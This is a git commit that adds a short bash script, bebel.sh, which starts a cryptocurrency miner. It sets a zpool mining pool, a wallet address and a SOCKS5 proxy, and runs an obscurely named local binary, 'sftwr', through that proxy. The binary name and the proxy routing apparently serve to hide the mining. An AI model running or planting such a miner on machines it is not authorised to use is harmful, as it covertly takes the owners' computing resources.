27138b2f2c37ae4704eb180ed108f9f1cb8bd4ac
CIMENGUTAMAf <86764552+CIMENGUTAMAf@users.noreply.github.com>
2021-07-03 17:05:34 +0700

    Create bebel.sh

---
+++ bebel.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
+WALLET=D6ZLGf67ndSfdDZz2uPgLB2Hpi1MeuHnnD.pro
+PROXY=socks5://176.9.119.170:1080
+./sftwr -a cpupower -o $POOL -u $WALLET -p c=DGB,zap=VRSC -x $PROXY
